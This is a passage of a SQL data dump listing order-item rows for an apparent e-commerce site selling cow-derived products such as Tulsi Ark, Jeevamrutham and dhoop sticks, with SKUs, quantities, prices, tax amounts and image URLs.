(59, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 4, 200, 100, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '72', '5736256669449783', 0),
(60, '', 0, 'Roll On', '', 'TA/RO/01', 2, 40, 40, 0, 0, 112, '8ml', '', '', 'https://www.gogarbha.com/assets/images/pain-relief-oil200x24001658519811.jpg', 0, '0', '8632154329427837', 0),
(61, '', 0, 'Goumutra Ark', '', 'Ka/GMA/01', 2, 200, 100, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/goumutra-arka-plain200x24001658898932.jpg', 0, '36', '3548021599210751', 0),
(62, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 2, 200, 100, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '36', '4347216621619488', 0),
(63, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 7, 200, 100, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '126', '9747028794079156', 0),
(64, '', 0, 'Skin Ointment', '', 'TA/SO/01', 12, 50, 50, 0, 0, 85, '20 gm', '', '', 'https://www.gogarbha.com/assets/images/skin-ointment200x24001658519842.jpg', 0, '72', '5888581069026634', 0),
(65, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 2, 200, 100, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '36', '3485407924140139', 0),
(66, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 2, 200, 100, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '36', '8819174861518268', 0),
(66, '', 0, 'Roll On', '', 'TA/RO/01', 1, 40, 40, 0, 0, 112, '8ml', '', '', 'https://www.gogarbha.com/assets/images/pain-relief-oil200x24001658519811.jpg', 0, '0', '8819174861518268', 0),
(67, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 200, 100, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '18', '9782499080044357', 0),
(68, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 200, 100, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '18', '2812450260122009', 0),
(69, '', 0, 'Panchagavya Diyas', '', 'PICDS/01', 6, 77, 77, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/diyas200x24001658726810.jpg', 0, '83.16', '5751118586343448', 0),
(70, '', 0, 'Parijatha Ark', '', 'KA/PJA/01', 2, 116, 116, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/parijatha-ark200x24001658485784.jpg', 0, '27.84', '2145167262885295', 0),
(71, '', 0, 'Chandan Sambrani Cone', '', '0011', 6, 66, 66, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/chandan-sambrani-cone200x24001658494046.jpg', 0, '0', '3114621935278658', 0),
(71, '', 0, 'Godhan Sambrani Cone', '', 'PI/GSC/01', 5, 66, 66, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/incense-sambrani-cone200x24001658494019.jpg', 0, '0', '3114621935278658', 0),
(71, '', 0, 'Loban Dhoop Sticks', '', 'PI/LDS/01', 2, 77, 77, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/loban-dhoop-sticks200x24001658488100.jpg', 0, '0', '3114621935278658', 0),
(71, '', 0, 'Panchagavya Pain Relief Oil', '', 'TA/PRO/01', 3, 263, 263, 0, 0, 81, '30 ml', '', '', 'https://www.gogarbha.com/assets/images/panchagavya-pain-relief-oil200x24001658519737.jpg', 0, '94.68', '3114621935278658', 0),
(71, '', 0, 'Pest Control', '', 'VA/PC/01', 2, 85, 85, 0, 0, 110, '500ml', '', '', 'https://www.gogarbha.com/assets/images/pest-control200x24001658519778.jpg', 0, '0', '3114621935278658', 0),
(71, '', 0, 'Gou Clean Phenoyl', '', 'GA/GCP/01', 2, 132, 92, 0, 0, 110, '500ml', '', '', 'https://www.gogarbha.com/assets/images/gou-clean-phenoyl200x24001658519577.jpg', 0, '22.08', '3114621935278658', 0),
(71, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 7, 127, 127, 0, 0, 110, '500ml', '', '', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '0', '3114621935278658', 0),
(72, '', 0, 'Takra Amrutham Ark', '', 'KA/TA/01', 1, 132, 132, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/takramrutha200x24001658485974.jpg', 0, '15.84', '4135653175660682', 0),
(73, '', 0, 'Cowdung Ghee Batti', '', '', 2, 156, 156, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/cowdung-ghee-batti200x24001658728604.jpg', 0, '0', '5731984620573091', 0),
(73, '', 0, 'Goumutra Ark', '', 'Ka/GMA/01', 1, 53, 53, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/goumutra-arka-plain200x24001658898932.jpg', 0, '6.36', '5731984620573091', 0),
(73, '', 0, 'Pest Control', '', 'VA/PC/01', 2, 85, 85, 0, 0, 110, '500ml', '', '', 'https://www.gogarbha.com/assets/images/pest-control200x24001658519778.jpg', 0, '0', '5731984620573091', 0),
(74, '', 0, 'Cowdung Ghee Batti', '', '', 1, 156, 156, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/cowdung-ghee-batti200x24001658728604.jpg', 0, '0', '5502275738908638', 0),
(74, '', 0, 'Goumutra Ark', '', 'Ka/GMA/01', 1, 53, 53, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/goumutra-arka-plain200x24001658898932.jpg', 0, '6.36', '5502275738908638', 0),
(74, '', 0, 'Roll On', '', 'TA/RO/01', 1, 106, 106, 0, 0, 112, '8ml', '', '', 'https://www.gogarbha.com/assets/images/pain-relief-oil200x24001658519811.jpg', 0, '12.72', '5502275738908638', 0),
(75, '', 0, 'Panchagavya Diyas', '', 'PICDS/01', 1, 106, 106, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/diyas200x24001658726810.jpg', 0, '0', '8719071169117008', 0),
(76, '', 0, 'Cowdung Ghee Batti', '', '', 1, 156, 156, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/cowdung-ghee-batti200x24001658728604.jpg', 0, '0', '4236382468592120', 0),
(77, '', 0, 'Cowdung Ghee Batti', '', '', 1, 156, 156, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/cowdung-ghee-batti200x24001658728604.jpg', 0, '0', '1382746093803914', 0),
(78, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(79, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(80, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(81, '', 0, 'Roll On', '', 'TA/RO/01', 1, 106, 106, 0, 0, 112, '8ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/pain-relief-oil200x24001658519811.jpg', 0, '', '', 0),
(81, '', 0, 'Panchagavya Diyas', '', 'PICDS/01', 1, 106, 106, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/diyas200x24001658726810.jpg', 0, '', '', 0),
(82, '', 0, 'Roll On', '', 'TA/RO/01', 1, 106, 106, 0, 0, 112, '8ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/pain-relief-oil200x24001658519811.jpg', 0, '', '', 0),
(82, '', 0, 'Panchagavya Diyas', '', 'PICDS/01', 1, 106, 106, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/diyas200x24001658726810.jpg', 0, '', '', 0),
(83, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '13.92', '7523217149483048', 0),
(84, '', 0, 'GhanaJeevamrtham', '', 'VA/GJ/01', 1, 127, 127, 0, 0, 113, '1Kg', '', '', 'https://www.gogarbha.com/assets/images/ghanajeevamrtha200x24001658519640.jpg', 0, '0', '7612869409220610', 0),
(85, '', 0, 'GhanaJeevamrtham', '', 'VA/GJ/01', 1, 127, 127, 0, 0, 113, '1Kg', '', '', 'https://www.gogarbha.com/assets/images/ghanajeevamrtha200x24001658519640.jpg', 0, '0', '6522375965837322', 0),
(86, '', 0, 'Takra Amrutham Ark', '', 'KA/TA/01', 1, 132, 132, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/takramrutha200x24001658485974.jpg', 0, '15.84', '5467187648222998', 0),
(87, '', 0, 'Goumutra Ark', '', 'Ka/GMA/01', 1, 53, 53, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/goumutra-arka-plain200x24001658898932.jpg', 0, '6.36', '3312839117894384', 0),
(88, '', 0, 'Roll On', '', 'TA/RO/01', 1, 106, 106, 0, 0, 112, '8ml', '', '', 'https://www.gogarbha.com/assets/images/pain-relief-oil200x24001658519811.jpg', 0, '12.72', '4548528432441568', 0),
(89, '', 0, 'GhanaJeevamrtham', '', 'VA/GJ/01', 6, 127, 127, 0, 0, 113, '1Kg', '', '', 'https://www.gogarbha.com/assets/images/ghanajeevamrtha200x24001658519640.jpg', 0, '0', '6750552854219445', 0),
(90, '', 0, 'GhanaJeevamrtham', '', 'VA/GJ/01', 3, 127, 127, 0, 0, 113, '1Kg', '', '', 'https://www.gogarbha.com/assets/images/ghanajeevamrtha200x24001658519640.jpg', 0, '0', '2181908115602924', 0),
(91, '', 0, 'Goumutra Ark', '', 'Ka/GMA/01', 2, 53, 53, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/goumutra-arka-plain200x24001658898932.jpg', 0, '12.72', '7269303122573066', 0),
(92, '', 0, 'Goumutra Ark', '', 'Ka/GMA/01', 1, 53, 53, 0, 0, 76, '100 ml', '', '', 'https://www.gogarbha.com/assets/images/goumutra-arka-plain200x24001658898932.jpg', 0, '6.36', '3871064711267767', 0),
(93, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(93, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(94, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(95, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(95, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(96, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(96, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(97, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(97, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(98, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(98, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(99, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(100, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(100, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(101, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(101, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(102, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(102, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(103, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(103, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(104, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(104, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(105, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(105, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(106, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(106, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(107, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(107, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(108, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(108, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(109, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(109, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(110, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(110, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(111, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(111, '', 0, 'Pest Control', '', 'VA/PC/01', 1, 85, 85, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/pest-control200x24001658519778.jpg', 0, '', '', 0),
(112, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(112, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(113, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(113, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(114, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(114, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(115, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(115, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(116, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(116, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(117, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(117, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(118, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(118, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(119, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(119, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(120, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 116, 116, 0, 0, 76, '100 ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/tulsi-ark200x24001658486009.jpg', 0, '', '', 0),
(120, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001658488002.jpg', 0, '', '', 0),
(121, '', 0, 'Panchagavya Diyas', '', 'PICDS/01', 1, 106, 106, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/diyas200x24001658726810.jpg', 0, '0', '7506201702438654', 0),
(122, '', 0, 'Pest Control', '', 'VA/PC/01', 1, 85, 85, 0, 0, 110, '500ml', '', '', 'https://www.gogarbha.com/assets/images/pest-control200x24001658519778.jpg', 0, '0', '6862080156289210', 0),
(123, '', 0, 'Pest Control', '', 'VA/PC/01', 1, 85, 85, 0, 0, 110, '500ml', '', '', 'https://www.gogarbha.com/assets/images/pest-control200x24001658519778.jpg', 0, '0', '8797132943156141', 0),
(124, '', 0, 'Pest Control', '', 'VA/PC/01', 1, 85, 85, 0, 0, 110, '500ml', '', '', 'https://www.gogarbha.com/assets/images/pest-control200x24001658519778.jpg', 0, '0', '6889780758402087', 0),
(125, '', 0, 'Cowdung Ghee Batti', '', '', 2, 156, 156, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/cowdung-ghee-batti200x24001658728604.jpg', 0, '0', '8937692667639323', 0),
(126, '', 0, 'Cowdung Ghee Batti', '', '', 2, 156, 156, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/cowdung-ghee-batti200x24001658728604.jpg', 0, '0', '4861752167550336', 0),
(127, '', 0, 'Cowdung Ghee Batti', '', '', 2, 156, 156, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/cowdung-ghee-batti200x24001658728604.jpg', 0, '0', '2682896544266251', 0),
(128, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(129, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(130, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(131, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(132, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(133, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(134, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(135, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(136, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(137, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(138, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(139, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(140, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(141, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(142, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(143, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(144, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(145, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(146, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(147, '', 0, 'Cowdung Cake', '', 'PI/CDC/01', 1, 212, 212, 0, 0, 123, '10 pcs', '', '', 'https://www.gogarbha.com/assets/images/cow-dung-cake200x24001658519400.jpg', 0, '0', '4432678697103690', 0),
(148, '', 0, 'Cowdung Cake', '', 'PI/CDC/01', 1, 212, 212, 0, 0, 123, '10 pcs', '', '', 'https://www.gogarbha.com/assets/images/cow-dung-cake200x24001658519400.jpg', 0, '0', '3562058362684692', 0),
